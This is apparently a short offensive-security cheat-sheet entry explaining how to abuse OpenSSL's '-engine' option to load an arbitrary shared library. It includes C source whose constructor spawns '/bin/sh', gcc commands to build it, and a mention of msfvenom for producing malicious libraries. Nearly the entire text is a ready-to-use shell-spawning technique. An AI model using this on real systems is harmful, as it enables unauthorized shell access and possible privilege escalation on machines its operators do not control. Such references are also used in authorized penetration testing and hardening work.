# OpenSSL Library Load

**OpenSSL can be used to load and run arbitrary libraries (.so) like this:**

```
openssl req -engine ./lib.so
```

**To make the required shared library, either use `msfvenom` to generate a shared library malware, or compile this code:**

```
#include <unistd.h>

__attribute__((constructor))
static void init() {
    execl("/bin/sh", "sh", NULL);
}
```

**Compilation flags:**
```
gcc -fPIC -o openssl.o -c openssl.c
gcc -shared -o openssl.so -lcrypto openssl.o
```
